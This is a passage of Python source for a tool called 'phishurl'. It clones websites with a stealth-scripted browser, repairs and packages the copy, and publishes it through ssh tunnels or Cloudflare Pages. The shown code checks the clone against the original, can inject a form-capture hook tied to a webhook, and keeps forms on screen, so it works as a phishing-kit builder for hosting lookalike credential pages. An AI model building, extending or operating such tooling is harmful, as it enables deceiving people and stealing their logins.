        first = not site.claimed
        site.claimed = True

    if first:
        def runner() -> None:
            try:
                site.start()
            except TunnelError as exc:
                site.state = "dead"
                site.error = str(exc)
            except Exception as exc:                    # noqa: BLE001 - reported, not raised
                site.state = "dead"
                site.error = f"{type(exc).__name__}: {exc}"[:200]

        threading.Thread(target=runner, name=f"publish-{job.id}", daemon=True).start()
    return site


def _close_all_tunnels() -> None:
    """Process exit is still a teardown. An ssh child left behind forwards to nothing."""
    with TUNNEL_LOCK:
        sites = list(TUNNELS.values())
        TUNNELS.clear()
    for site in sites:
        with contextlib.suppress(Exception):
            site.stop()


atexit.register(_close_all_tunnels)


def _gate(name: str, passed: bool, score: float, detail: str,
          diagnoses: Optional[list[dict[str, Any]]] = None) -> dict[str, Any]:
    return {"name": name, "passed": bool(passed), "score": round(max(0.0, min(1.0, score)), 3),
            "detail": detail, "diagnoses": diagnoses or []}


def static_gates(root: Path, pages: list[Page]) -> dict[str, dict[str, Any]]:
    """The checks that need no browser: does every local reference land on a file."""
    missing: list[dict[str, Any]] = []
    checked = 0
    styles = 0
    scripts = 0
    forms_total = 0
    forms_clean = 0
    render_ok = True
    render_detail = "mirror files present"

    for page in pages:
        path = mirror_path(root, page.local)
        if not path.is_file():
            render_ok = False
            render_detail = f"{page.local} was never written"
            continue
        html = read_text(path)
        # Grade the copy against the source, not against a floor: a two-word page
        # that still has its two words is a good mirror, and a fixed word count
        # would fail it forever and send the healer chasing nothing.
        local_words = len(re.sub(r"<[^>]+>", " ", html).split())
        source_words = len(re.sub(r"<[^>]+>", " ", page.html).split()) if page.html else 0
        need = max(1, int(source_words * 0.6)) if source_words else 1
        if local_words < need:
            render_ok = False
            render_detail = (f"{page.local} kept {local_words} word(s) of {source_words}"
                             if source_words else f"{page.local} is empty")
        for match in LOCAL_ATTR_RE.finditer(html):
            raw = match.group("url").strip()
            if not raw or raw.startswith(("http://", "https://", "//", "data:", "mailto:",
                                          "javascript:", "#", "tel:")):
                continue
            target = raw.split("?")[0].split("#")[0]
            if not target:
                continue
            checked += 1
            resolved = posixpath.normpath(posixpath.join(posixpath.dirname(page.local), target))
            if not mirror_path(root, resolved).is_file():
                missing.append({"gate": "assets", "url": raw, "local": resolved,
                                "kind": kind_from_url(raw) or "other", "page": page.local})
            if target.endswith(".css"):
                styles += 1
            if target.endswith(".js"):
                scripts += 1
        forms_total += len(re.findall(r"<form\b", html, re.I))
        forms_clean += len(re.findall(r"""<form\b[^>]*action=["']#["']""", html, re.I))

    missing = missing[:60]
    missing_css = [item for item in missing if item["local"].endswith(".css")]
    missing_js = [item for item in missing if item["local"].endswith(".js")]
    missing_nav = [item for item in missing
                   if item["local"].endswith(".html") or not posixpath.splitext(item["local"])[1]]
    asset_score = 1.0 if not missing else max(0.0, 1.0 - (len(missing) / max(checked, 1)))
    style_ok = not missing_css
    js_ok = not missing_js
    nav_ok = not missing_nav
    form_ok = forms_total == forms_clean

    return {
        "render": _gate("render", render_ok, 1.0 if render_ok else 0.0, render_detail),
        "assets": _gate("assets", not missing, asset_score,
                        f"every one of {checked} local reference(s) resolves" if not missing
                        else f"{len(missing)} of {checked} local reference(s) point at nothing",
                        missing),
        "style": _gate("style", style_ok, 1.0 if style_ok else 0.35,
                       f"{styles} stylesheet reference(s) resolve" if style_ok
                       else f"{len(missing_css)} stylesheet(s) are missing", missing_css),
        "js": _gate("js", js_ok, 1.0 if js_ok else 0.35,
                    f"{scripts} script reference(s) resolve" if js_ok
                    else f"{len(missing_js)} script(s) are missing", missing_js),
        "nav": _gate("nav", nav_ok, 1.0 if nav_ok else 0.5,
                     "no broken internal links" if nav_ok
                     else f"{len(missing_nav)} link(s) point at nothing", missing_nav),
        "form": _gate("form", form_ok, 1.0 if form_ok else 0.5,
                      f"{forms_clean}/{forms_total} form(s) neutralised" if forms_total
                      else "no forms on the page", []),
    }


async def browser_gates(base_url: str, pages: list[Page], sanitized: bool,
                        root: str | Path, known: Optional[set[str]] = None
                        ) -> dict[str, dict[str, Any]]:
    """Serve the mirror, load it, and grade what a visitor actually gets.

    `known` is the set of file names the mirrored documents themselves mention. A
    failing response for a name outside that set came from the page's own runtime —
    a chunk it composes, an api call it makes — and is not a defect in the copy. It
    is reported, never counted, and never healed.
    """
    if playwright_mod is None:
        return {}
    from playwright.async_api import async_playwright

    bad: list[dict[str, Any]] = []
    ambient: list[dict[str, Any]] = []
    errors: list[str] = []
    text_len = 0
    per_page: list[tuple[str, int]] = []
    sheets = 0
    rules = 0
    links: list[dict[str, Any]] = []
    forms: list[dict[str, Any]] = []
    loaded = 0

    async with async_playwright() as pw:
        browser = await launch_chromium(pw)
        try:
            context = await browser.new_context(viewport={"width": 1366, "height": 900},
                                                ignore_https_errors=True)
            await context.add_init_script(STEALTH_JS)
            page = await context.new_page()
            for target in pages[:4]:
                url = urljoin(base_url, quote(target.local))
                responses: list[tuple[str, int]] = []
                page.on("response", lambda r, sink=responses: sink.append((r.url, r.status)))
                page.on("pageerror", lambda exc: errors.append(str(exc).splitlines()[0][:200]))
                try:
                    await page.goto(url, wait_until="load", timeout=RENDER_TIMEOUT_MS)
                    await page.wait_for_timeout(400)
                    probe = await page.evaluate(PROBE_SCRIPT)
                    loaded += 1
                    page_text = int(probe.get("text") or 0)
                    per_page.append((target.local, page_text))
                    text_len = max(text_len, page_text)
                    sheets = max(sheets, int(probe.get("sheets") or 0))
                    rules = max(rules, int(probe.get("rules") or 0))
                    for href, status in responses:
                        if status >= 400 and not href.startswith("data:"):
                            rel = safe_path(unquote(urlparse(href).path.lstrip("/"))
                                            or "index.html")
                            entry = {"gate": "assets", "url": href, "status": status,
                                     "local": rel, "page": target.local,
                                     "kind": kind_from_url(href)}
                            name = rel.rsplit("/", 1)[-1].lower()
                            if known is not None and name and name not in known:
                                ambient.append(entry)
                            elif entry not in bad:
                                bad.append(entry)
                    for link in probe.get("links") or []:
                        links.append({**link, "page": target.local, "base": url})
                    forms.extend(probe.get("forms") or [])
                except Exception as exc:
                    errors.append(f"{target.local}: {type(exc).__name__} {exc}"[:200])
                finally:
                    with contextlib.suppress(Exception):
                        page.remove_listener("response", lambda r: None)
            await context.close()
        finally:
            await browser.close()

    internal = [link for link in links
                if (link.get("abs") or "").startswith(base_url)]
    broken_links: list[dict[str, Any]] = []
    for link in internal[:400]:
        rel = unquote(urlparse(link.get("abs") or "").path.lstrip("/"))
        if not rel or rel.endswith("/"):
            rel += "index.html"
        link["local"] = rel
        if not mirror_path(Path(root), safe_path(rel)).is_file():
            broken_links.append(link)

    # The baseline is what the live page actually showed. A page with eleven words
    # on it is a pass if the mirror still shows eleven words — a fixed character
    # floor fails every sparse page and burns the heal budget chasing a phantom.
    baseline = max([page.text_len for page in pages] or [0])
    floor = max(8, int(baseline * 0.6))
    render_ok = bool(loaded) and text_len >= floor
    render_score = 1.0 if render_ok else (0.5 if loaded else 0.0)
    # A page that renders emptier than its own source is the one thing left to
    # diagnose here: either the copy was taken from a shell, or the page's bundle
    # booted and erased the markup the server sent. Both have an action.
    thin = [{"gate": "render", "page": local, "text": size, "error": "thin"}
            for local, size in per_page if size < floor]
    asset_score = 1.0 if not bad else max(0.0, 1.0 - min(1.0, len(bad) / 10.0))
    style_ok = sheets > 0 and rules > 0
    js_ok = not errors
    form_ok = all((f.get("action") in ("#", None)) for f in forms) if sanitized else True

    return {
        "render": _gate("render", render_ok, render_score,
                        f"{loaded} page(s) loaded · {text_len} chars of visible text "
                        f"(source had {baseline}, floor {floor})"
                        if loaded else "the mirror did not load", thin[:4]),
        "assets": _gate("assets", not bad, asset_score,
                        ("no broken reference" if not bad
                         else f"{len(bad)} broken reference(s)")
                        + (f" · {len(ambient)} runtime request(s) left to the page"
                           if ambient else ""),
                        bad),
        "style": _gate("style", style_ok, 1.0 if style_ok else 0.3,
                       f"{sheets} sheet(s), {rules} rule(s) applied" if style_ok
                       else "stylesheets did not apply"),
        "js": _gate("js", js_ok, 1.0 if js_ok else 0.4,
                    "no script errors" if js_ok else f"{len(errors)} script error(s)",
                    [{"gate": "js", "error": err} for err in errors[:10]]),
        "nav": _gate("nav", True, 1.0, f"{len(internal)} internal link(s) checked",
                     [{"gate": "nav", "href": link.get("href"), "local": link.get("local", ""),
                       "page": link.get("page")} for link in broken_links[:10]]),
        "form": _gate("form", form_ok, 1.0 if form_ok else 0.4,
                      f"{len(forms)} form(s) neutralised" if forms else "no forms rendered"),
    }


def merge_gates(*sets: dict[str, dict[str, Any]]) -> dict[str, dict[str, Any]]:
    """Worst case wins: a gate passes only if every pass said it passed."""
    out: dict[str, dict[str, Any]] = {}
    for name in GATE_NAMES:
        present = [group[name] for group in sets if name in group]
        if not present:
            continue
        failures = [gate for gate in present if not gate["passed"]]
        score = min(gate["score"] for gate in present)
        # the browser pass speaks last, so its detail is the one worth reporting
        chosen = failures[0] if failures else present[-1]
        diagnoses: list[dict[str, Any]] = []
        for gate in present:
            diagnoses.extend(gate.get("diagnoses") or [])
        out[name] = _gate(name, not failures, score, chosen["detail"], diagnoses[:20])
    return out


def score_of(gates: dict[str, dict[str, Any]]) -> float:
    if not gates:
        return 0.0
    return round(sum(gate["score"] for gate in gates.values()) / len(gates), 3)


class Healer:
    """Turns diagnoses into edits on disk, and reports what it did either way."""

    def __init__(self, job: Job, root: Path, rewriter: Rewriter, base_url: str):
        self.job = job
        self.root = root
        self.rewriter = rewriter
        self.base_url = base_url
        self.used: set[str] = set()

    def _record(self, iteration: int, gate: str, diagnosis: str, action: str,
                outcome: str) -> HealEvent:
        event = HealEvent(iteration=iteration, gate=gate, diagnosis=diagnosis,
                          action=action, outcome=outcome)
        self.job.heals.append(event)
        self.job.emit({"event": "heal", **event.public()})
        return event

    async def apply(self, iteration: int, gates: dict[str, dict[str, Any]],
                    downloader: Downloader) -> int:
        """Run every diagnosis that has not already been tried. Returns the count."""
        applied = 0
        for name in GATE_NAMES:
            gate = gates.get(name)
            if not gate or gate["passed"]:
                continue
            for diagnosis in gate.get("diagnoses") or []:
                if applied >= 10:
                    return applied
                # one target, one action: the static pass and the browser pass
                # report the same missing file, and healing it twice churns.
                target = (diagnosis.get("local") or diagnosis.get("href")
                          or diagnosis.get("url") or diagnosis.get("error") or "?")
                key = f"{name}:{target}"
                if key in self.used:
                    continue
                self.used.add(key)
                applied += 1
                await self._apply_one(iteration, name, diagnosis, downloader)
        return applied

    async def _apply_one(self, iteration: int, gate: str, diagnosis: dict[str, Any],
                         downloader: Downloader) -> None:
        page = next((p for p in self.job.pages if p.local == diagnosis.get("page")), None)
        page = page or (self.job.pages[0] if self.job.pages else None)
        url = diagnosis.get("url") or diagnosis.get("href") or ""
        where = diagnosis.get("page") or (page.local if page else "mirror")

        if gate == "style" and page is not None:
            await self._inline_imports(iteration, page, downloader)
            if url or diagnosis.get("local"):
                await self._refetch_or_placeholder(iteration, gate, url, where, downloader,
                                                  local=diagnosis.get("local", ""))
            return

        if gate == "assets" or (gate == "js" and diagnosis.get("error")):
            if gate == "js" and page is not None and playwright_mod is not None:
                await self._rerender(iteration, page, downloader, reason="script did not settle")
                return
            if not url and not diagnosis.get("local"):
                return
            await self._refetch_or_placeholder(iteration, gate, url, where, downloader,
                                              local=diagnosis.get("local", ""))
            return

        if gate == "render" and page is not None:
            # Two ways a copy renders thinner than its source. If the render never
            # landed, take the finished DOM. If it did land and the copy still comes
            # up empty, the page's own bundle is erasing it — freeze the document.
            if not page.rendered:
                await self._rerender(iteration, page, downloader, reason="page came back thin")
                return
            self._freeze(iteration, page)
            return

        if gate == "nav" and page is not None:
            href = diagnosis.get("href") or ""
            absolute = absolutize(page.url, href) if href else ""
            local = self.rewriter.assets.get(absolute) or self.rewriter.pages.get(absolute)
            if local:
                await self._rewrite_href(page, href, relref(page.local, local))
                self._record(iteration, "nav", f"{href} pointed at nothing",
                             "re-resolved the href against the original base url",
                             f"now points at {local}")
            elif absolute:
                await self._rewrite_href(page, href, absolute)
                self._record(iteration, "nav", f"{href} was not mirrored",
                             "left the link absolute",
                             f"the copy links out to {absolute}")
            return

        if gate == "form" and page is not None:
            html = read_text(mirror_path(self.root, page.local))
            new_html, count = sanitize_forms(html)
            write_text(self.root, page.local, new_html)
            self._record(iteration, "form", "a form still had a live action",
                         "ran the sanitizer again on this page",
                         f"{count} form(s) neutralised")
            return

        if gate == "style" and page is not None:
            await self._inline_imports(iteration, page, downloader)

    # -- individual actions -------------------------------------------------
    def _write_stand_in(self, rel: str, kind: str) -> str:
        """Put something at a path a page asks for — but never over a real file.

        A stand-in is a last resort for a reference that cannot be satisfied. If the
        bytes are already there, the diagnosis was wrong and writing would destroy
        the very file the mirror was graded on.
        """
        target = mirror_path(self.root, rel)
        if target.is_file() and target.stat().st_size > 0:
            return f"{rel} already holds {human_bytes(target.stat().st_size)} — left alone"
        if kind == "css":
            write_bytes(self.root, rel, b"/* phishurl: the original stylesheet never arrived */\n")
            return f"empty stylesheet at {rel}; the missing original stays in the manifest"
        if kind == "js":
            write_bytes(self.root, rel, b"/* phishurl: the original script never arrived */\n")
            return f"empty script at {rel}; the missing original stays in the manifest"
        write_bytes(self.root, rel, PNG_PLACEHOLDER)
        return f"transparent placeholder at {rel}; the layout keeps its shape"

    async def _refetch_or_placeholder(self, iteration: int, gate: str, url: str,
                                      where: str, downloader: Downloader,
                                      local: str = "") -> None:
        if local and not url.startswith(("http://", "https://", "//")):
            # Mirror-relative reference: the file the page asks for is simply absent,
            # so the stand-in goes at exactly that path. Nothing to fetch.
            rel = safe_path(unquote(local.split("?")[0]))
            kind = kind_from_url(rel) or ("css" if gate == "style" else "other")
            outcome = self._write_stand_in(rel, kind)
            matched = next((a for a in self.job.assets.values() if a.local == rel), None)
            if matched is not None:
                matched.status = "placeholder"
                matched.error = matched.error or "never arrived"
                self.job.emit({"event": "asset", "url": matched.url, "kind": matched.kind,
                               "status": "placeholder", "size": 0})
            self._record(iteration, gate, f"{rel} was missing from the mirror",
                         "wrote a stand-in at the path the page asks for", outcome)
            return

        if self.base_url and url.startswith(self.base_url):
            # The 404 came from the mirror itself: same idea, path taken off the url.
            rel = safe_path(unquote(urlparse(url).path.lstrip("/")) or "index.html")
            kind = kind_from_url(url) or ("css" if gate == "style" else "other")
            outcome = self._write_stand_in(rel, kind)
            self._record(iteration, gate, f"{rel} was missing from the mirror",
                         "wrote a stand-in at the path the page asks for", outcome)
            return

        referer = ""
        for page in self.job.pages:
            referer = page.url
            break
        data, content_type, status, error = await downloader.fetch(url, referer)
        kind = kind_from_url(url) or ("css" if gate == "style" else "other")
        if data:
            rel = asset_relpath(url, kind)
            write_bytes(self.root, rel, data)
            asset = self.job.assets.get(url) or Asset(url=url, kind=kind, via="heal")
            asset.local, asset.size, asset.status = rel, len(data), "done"
            asset.sha1 = sha1_of(data)
            asset.attempts += 1
            self.job.assets[url] = asset
            self.rewriter.refresh()
            self.job.emit({"event": "asset", "url": url, "kind": asset.kind,
                           "status": "done", "size": asset.size})
            self._record(iteration, gate, f"{url} came back {status or 'empty'} on the first pass",
                         "fetched it again with a rotated user agent and the page as referer",
                         f"recovered {human_bytes(len(data))} into {rel}")
            return

        rel = asset_relpath(url, kind)
        outcome = self._write_stand_in(rel, kind)
        asset = self.job.assets.get(url) or Asset(url=url, kind=kind, via="heal")
        asset.local, asset.size, asset.status = rel, 0, "placeholder"
        asset.error = error
        asset.attempts += 1
        self.job.assets[url] = asset
        self.rewriter.refresh()
        self.job.emit({"event": "asset", "url": url, "kind": asset.kind,
                       "status": "placeholder", "size": 0, "error": error})
        self._record(iteration, gate, f"{url} never arrived ({error or status})",
                     "wrote a stand-in so the page does not break its own layout",
                     outcome)

    async def _rerender(self, iteration: int, page: Page, downloader: Downloader,
                        reason: str) -> None:
        try:
            result = await render_page(page.url, proxy=self.job.options.proxy, prefer="dom")
        except Exception as exc:
            self._record(iteration, "render", f"{page.local} · {reason}",
                         "re-rendered the page with Playwright",
                         f"render failed again: {type(exc).__name__} {exc}"[:180])
            return

        extraction = extract_refs(result.html, page.url)
        before = len(self.job.assets)
        await downloader.download(extraction.refs, page.url)
        page.html = result.html
        page.rendered = True
        page.text_len = result.text_len
        self.rewriter.refresh()
        new_html, hits = self.rewriter.rewrite_doc(result.html, page.local, page.url)
        if self.job.options.sanitize:
            new_html, _forms = sanitize_forms(new_html)
        if self.job.options.webhook:
            new_html = inject_capture(new_html, self.job)
        write_text(self.root, page.local, new_html)
        page.size = len(new_html.encode("utf-8"))
        self.job.emit({"event": "page", "url": page.url, "local": page.local,
                       "status": "done", "size": page.size})
        self._record(iteration, "render", f"{page.local} · {reason}",
                     "re-rendered the page, re-extracted and re-downloaded its references",
                     f"{hits} reference(s) rewritten, {len(self.job.assets) - before} new asset(s)")

    def _freeze(self, iteration: int, page: Page) -> None:
        """Serve the document as sent, with the page's own bundle unplugged.

        The chunks it wants are composed at runtime from a name that lives inside
        the bundle — nothing a mirror can satisfy. Unplugging the bundle leaves the
        markup the server rendered, which is the page a visitor is supposed to see.
        """
        path = mirror_path(self.root, page.local)
        html = read_text(path)
        if not html:
            return
        frozen, count = freeze_scripts(html)
        if not count:
            self._record(iteration, "render", f"{page.local} renders thinner than its source",
                         "looked for external scripts to freeze",
                         "the page carries none — nothing to unplug")
            return
        write_text(self.root, page.local, frozen)
        page.size = len(frozen.encode("utf-8"))
        self.job.emit({"event": "page", "url": page.url, "local": page.local,
                       "status": "done", "size": page.size})
        self._record(iteration, "render",
                     f"{page.local} · the page's bundle boots and erases the markup "
                     f"the server sent",
                     "froze every external script so the rendered document survives",
                     f"{count} script(s) unplugged · the form stays on screen without them")

    async def _rewrite_href(self, page: Page, href: str, replacement: str) -> None:
        path = mirror_path(self.root, page.local)
        html = read_text(path)
        if not html or not href:
            return
        html = html.replace(f'"{href}"', f'"{replacement}"').replace(f"'{href}'",
                                                                     f"'{replacement}'")
        write_text(self.root, page.local, html)

    async def _inline_imports(self, iteration: int, page: Page, downloader: Downloader) -> None:
        """A missing @import is inlined as a style block so the chain survives the
        copy even when the parent sheet is gone."""
        path = mirror_path(self.root, page.local)
        html = read_text(path)
        if not html:
            return
        soup = bs4.BeautifulSoup(html, "lxml") if bs4 is not None else None
        if soup is None:
            return
        changed = 0
        for tag in soup.find_all("link"):
            href = tag.get("href") or ""
            if not href.endswith(".css") or href.startswith(("http://", "https://")):
                continue
            local = posixpath.normpath(posixpath.join(posixpath.dirname(page.local), href))
            if mirror_path(self.root, local).is_file():
                continue
            absolute = absolutize(page.url, href)
            data, _ctype, _status, _error = await downloader.fetch(absolute, page.url)
            if not data:
                continue
            css_text = decode_body(data, "text/css")
            css_text = re.sub(r"@import\s+(?:url\()?['\"]?[^;]+;", "", css_text)
            style = soup.new_tag("style")
            style.string = css_text
            tag.replace_with(style)
            changed += 1
        if changed:
            write_text(self.root, page.local, str(soup))
            self._record(iteration, "style", f"{changed} stylesheet(s) missing from the mirror",
                         "inlined the stylesheet body as a <style> block",
                         "the page keeps its styling without the external sheet")

# ---------------------------------------------------------------------------
# 11. packager
#
# The tree on disk is already the artifact: one directory, relative links, no
# absolute host baked into a stylesheet. Packaging only adds the manifest and
# proves that every file it writes carries the bytes it claims.
# ---------------------------------------------------------------------------


def build_manifest(job: Job, root: Path, dedupe: dict[str, int]) -> dict[str, Any]:
    pages = [{"url": p.url, "local": p.local, "status": p.status, "size": p.size,
              "rendered": p.rendered, "error": p.error} for p in job.pages]
    assets = []
    for asset in job.assets.values():
        assets.append({"url": asset.url, "local": asset.local, "kind": asset.kind,
                       "status": asset.status, "size": asset.size, "sha1": asset.sha1,
                       "content_type": asset.content_type, "attempts": asset.attempts,
                       "rewritten": bool(asset.local), "error": asset.error,
                       "via": asset.via})
    manifest = {
        "generator": f"{APP} {VERSION}",
        "generated": utcnow(),
        "source": job.options.url,
        "options": {"render": job.options.render, "sanitize": job.options.sanitize,
                    "depth": job.options.depth, "max_assets": job.options.max_assets,
                    "deploy": job.options.deploy},
        "counts": {"pages": len(pages), "assets": len(assets), "bytes": job.bytes,
                   "failed": job.failures,
                   "placeholders": sum(1 for a in assets if a["status"] == "placeholder")},
        "dedupe": dedupe,
        "gates": {name: {"passed": gate["passed"], "score": gate["score"],
                         "detail": gate["detail"]} for name, gate in job.gates.items()},
        "heals": [heal.public() for heal in job.heals],
        "pages": pages,
        "assets": sorted(assets, key=lambda item: item["local"] or item["url"]),
        "deployment": asdict(job.deployment) if job.deployment else None,
        "notes": [
            "Every local reference in this mirror is relative; the directory can be "
            "served from any host, including a filesystem path.",
            "Forms were neutralised: action stripped, submit captured and cancelled.",
            "Assets that never arrived are recorded as placeholders, never as successes.",
        ],
    }
    write_text(root, "manifest.json", json.dumps(manifest, indent=2))
    return manifest


def package(root: Path, job: Job) -> tuple[Path, int, int]:
    """Zip the mirror, preserving the tree. Returns (zip path, files, bytes)."""
    zip_path = root.parent / f"{root.name}.zip"
    files = 0
    total = 0
    seen: dict[str, str] = {}
    dedupe = {"references": len(job.assets), "files": 0, "identical": 0}
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED,
                         compresslevel=9) as archive:
        for path in sorted(root.rglob("*")):
            if not path.is_file():
                continue
            rel = path.relative_to(root).as_posix()
            if rel.endswith(".zip") and path.name == ZIP_NAME:
                continue
            digest = sha256_of_file(path)
            if digest in seen:
                dedupe["identical"] += 1
                job.emit({"event": "log", "level": "debug",
                          "message": f"identical bytes · {rel} matches {seen[digest]}"})
            else:
                seen[digest] = rel
                dedupe["files"] += 1
            archive.write(path, arcname=rel)
            files += 1
            total += path.stat().st_size
    job.zip_path = str(zip_path)
    job.emit({"event": "package", "path": str(zip_path), "files": files, "bytes": total,
              "unique": dedupe["files"]})
    return zip_path, files, total


# ---------------------------------------------------------------------------
# 12. cloudflare pages
#
# Direct upload, four calls: create the project, post the zip, poll the deployment,
# hand back the URL. 401/403 gets one readable sentence; 429 gets exponential
# backoff; the token never appears in a log line or an event.
# ---------------------------------------------------------------------------

CF_BASE = os.environ.get("PHISHURL_CF_BASE", "https://api.cloudflare.com/client/v4")
# The two values a user gets wrong when Pages returns 403: the permission they did
# not add, and the account id they pasted from somewhere else. Both are named in
# every error so the fix is a click instead of a guess.
CF_TOKEN_URL = "https://dash.cloudflare.com/profile/api-tokens"
CF_SCOPE = "Account · Cloudflare Pages · Edit"


def cf_detail(payload: Any) -> str:
    """Cloudflare's own error strings, flattened to one line."""
    errors = payload.get("errors") if isinstance(payload, dict) else None
    if isinstance(errors, list) and errors:
        return "; ".join(str(item.get("message", item))[:160] for item in errors[:2])
    return ""


class CloudflareError(RuntimeError):
    pass


class Cloudflare:
    """Direct upload against a token. The account id is a convenience, not a requirement.

    A token is scoped to an account, so `GET /accounts` already answers which one it
    can reach. Asking for the id as a second credential only adds a field to get
    wrong — so a supplied id is verified when it is visible and dropped with a note
    when it is not.
    """

    def __init__(self, token: str, account_id: str = ""):
        self.token = (token or "").strip()
        self.account_id = (account_id or "").strip()
        self._account_cache: dict[str, Any] = {}
        self.note = ""
        if not self.token:
            raise CloudflareError(
                f"no api token — create one at {CF_TOKEN_URL} with {CF_SCOPE}")

    @property
    def headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}"}

    async def _request(self, method: str, path: str, **kwargs: Any) -> tuple[int, dict[str, Any]]:
        if httpx is None:
            raise CloudflareError("httpx is not installed — pip install httpx")
        url = f"{CF_BASE}{path}"
        timeout = httpx.Timeout(90.0, connect=20.0)
        last: tuple[int, dict[str, Any]] = (0, {})
        for attempt in range(5):
            try:
                async with httpx.AsyncClient(timeout=timeout) as client:
                    response = await client.request(method, url, headers=self.headers, **kwargs)
            except Exception as exc:
                last = (0, {"error": f"{type(exc).__name__}: {exc}"[:200]})
                await asyncio.sleep(1.5 * (2 ** attempt))
                continue
            try:
                payload = response.json()
            except Exception:
                payload = {"raw": response.text[:400]}
            if response.status_code in (429,) or response.status_code >= 500:
                last = (response.status_code, payload)
                await asyncio.sleep(1.5 * (2 ** attempt))
                continue
            # 10000 / 9106 / 9109 arrive as HTTP 400 with the token blamed in the body:
            # "Authentication error", "Invalid access token", "Invalid format". They are
            # the same wall as a 403 and get the same sentence.
            codes = {item.get("code") for item in payload.get("errors") or []
                     if isinstance(item, dict)} if isinstance(payload, dict) else set()
            if response.status_code in (401, 403) or codes & {10000, 9106, 9109}:
                detail = cf_detail(payload)
                raise CloudflareError(
                    f"cloudflare refused the token (HTTP {response.status_code}"
                    + (f" · {detail}" if detail else "") + f"). the token needs {CF_SCOPE} "
                    f"— create or edit it at {CF_TOKEN_URL}")
            return response.status_code, payload
        status, payload = last
        raise CloudflareError(f"cloudflare did not answer after 5 attempts "
                              f"(last HTTP {status}) {cf_detail(payload)}".strip())

    async def account(self) -> dict[str, Any]:
        """The account this token can actually reach. One call, cached for the site."""
        if self._account_cache:
            return self._account_cache
        status, payload = await self._request("GET", "/accounts?per_page=50")
        if status != 200:
            raise CloudflareError(f"could not list accounts · HTTP {status} "
                                  f"{cf_detail(payload)}".strip())
        rows = [row for row in (payload.get("result") or [])
                if isinstance(row, dict) and row.get("id")]
        if not rows:
            raise CloudflareError(
                "the token is valid but sees no account — a Pages token has to be scoped "
                f"to an account, not to a zone. reissue at {CF_TOKEN_URL} with {CF_SCOPE}")
        chosen = rows[0]
        if self.account_id:
            match = [row for row in rows if str(row.get("id")) == self.account_id]
            if match:
                chosen = match[0]
            else:
                self.note = (f"the account id in settings is not visible to this token "
                             f"— publishing to {chosen.get('name') or chosen.get('id')}")
        self.account_id = str(chosen.get("id"))
        self._account_cache = chosen
        return chosen

    async def diagnose(self) -> dict[str, Any]:
        """Everything that decides whether a deploy will work, in one call.

        Never raises: the settings card renders this straight onto the page, so a
        broken token has to arrive as a sentence and a link, not a stack trace. The
        Pages read is the check that matters — a token can pass `GET /accounts` and
        still be unable to touch Pages, which is the exact 403 this replaces.
        """
        report: dict[str, Any] = {"ok": False, "account_id": self.account_id,
                                  "account_name": "", "pages": False, "note": "",
                                  "checks": [], "error": "", "fix": ""}

        def check(name: str, ok: bool, detail: str = "") -> bool:
            report["checks"].append({"name": name, "ok": bool(ok), "detail": detail})
            return bool(ok)

        try:
            account = await self.account()
        except CloudflareError as exc:
            check("token accepted", False, str(exc)[:200])
            report["error"] = str(exc)
            report["fix"] = f"create a token at {CF_TOKEN_URL} with {CF_SCOPE}"
            return report

        aid = str(account.get("id"))
        report["account_id"] = aid
        report["account_name"] = str(account.get("name") or "unknown")
        report["note"] = self.note
        check("token accepted", True, f"{aid[:8]}…")
        check("account visible", True, report["account_name"])
        if self.note:
            check("account id matches", False, self.note)

        try:
            status, payload = await self._request("GET", f"/accounts/{aid}")
            check(f"account read · HTTP {status}", status == 200, cf_detail(payload))
        except CloudflareError as exc:
            check("account read", False, str(exc)[:200])

        try:
            status, payload = await self._request(
                "GET", f"/accounts/{aid}/pages/projects?per_page=1")
            report["pages"] = status == 200
            check(f"pages read · HTTP {status}", report["pages"],
                  cf_detail(payload) or ("ok" if report["pages"] else ""))
        except CloudflareError as exc:
            check("pages read", False, str(exc)[:200])
            report["error"] = str(exc)
            report["fix"] = f"add {CF_SCOPE} to the token at {CF_TOKEN_URL}"
            return report

        if not report["pages"]:
            report["error"] = "the token cannot read Pages on this account"
            report["fix"] = f"add {CF_SCOPE} at {CF_TOKEN_URL}"
            return report

        report["ok"] = True
        return report

    async def verify(self) -> dict[str, Any]:
        report = await self.diagnose()
        if not report["ok"]:
            raise CloudflareError(report["error"] or "cloudflare did not verify")
        return {"ok": True, "account_name": report["account_name"],
                "account_id": report["account_id"], "pages": True}

    async def ensure_project(self, name: str) -> tuple[dict[str, Any], bool]:
        aid = str((await self.account()).get("id"))
        status, payload = await self._request(
            "POST", f"/accounts/{aid}/pages/projects",
            json={"name": name, "production_branch": "main"})
        if status in (200, 201):
            return payload.get("result") or {}, True
        if status == 409:
            status, payload = await self._request(
                "GET", f"/accounts/{aid}/pages/projects/{name}")
            if status == 200:
                return payload.get("result") or {}, False
        raise CloudflareError(f"could not create project {name} (HTTP {status}) "
                              f"{cf_detail(payload)}".strip())

    async def upload(self, name: str, zip_bytes: bytes) -> str:
        aid = str((await self.account()).get("id"))
        status, payload = await self._request(
            "POST", f"/accounts/{aid}/pages/projects/{name}/deployments",
            files={"file": (ZIP_NAME, zip_bytes, "application/zip")})
        if status not in (200, 201):
            raise CloudflareError(f"upload rejected (HTTP {status}) "
                                  f"{cf_detail(payload)}".strip())
        result = payload.get("result") or {}
        identifier = str(result.get("id") or "")
        if not identifier:
            raise CloudflareError("upload returned no deployment id")
        return identifier

    async def poll(self, name: str, deployment_id: str,
                   on_tick: Optional[Callable[[str], None]] = None) -> dict[str, Any]:
        aid = str((await self.account()).get("id"))
        started = time.monotonic()
        checks = 0
        while time.monotonic() - started < CF_POLL_TIMEOUT:
            checks += 1
            status, payload = await self._request(
                "GET", f"/accounts/{aid}/pages/projects/{name}"
                       f"/deployments/{deployment_id}")
            result = payload.get("result") or {}
            stage = ((result.get("latest_stage") or {}).get("status")
                     or (result.get("stage") or {}).get("status") or "")
            if on_tick:
                on_tick(stage or "queued")
            if stage == "success":
                return result
            if stage == "failure":
                raise CloudflareError("the deployment finished with stage=failure — "
                                      "open the project in the Cloudflare dashboard for the log")
            await asyncio.sleep(CF_POLL_INTERVAL)
        raise CloudflareError(f"deployment did not settle within {int(CF_POLL_TIMEOUT)}s "
                              f"({checks} polls)")

    async def deploy(self, name: str, zip_bytes: bytes,
                     on_event: Callable[[dict[str, Any]], None]) -> Deployment:
        record = Deployment(project=name, status="uploading")
        on_event({"event": "deploy", "project": name, "status": "project", "url": ""})
        account = await self.account()
        on_event({"event": "log", "level": "info",
                  "message": f"cloudflare account · {account.get('name') or account.get('id')}"
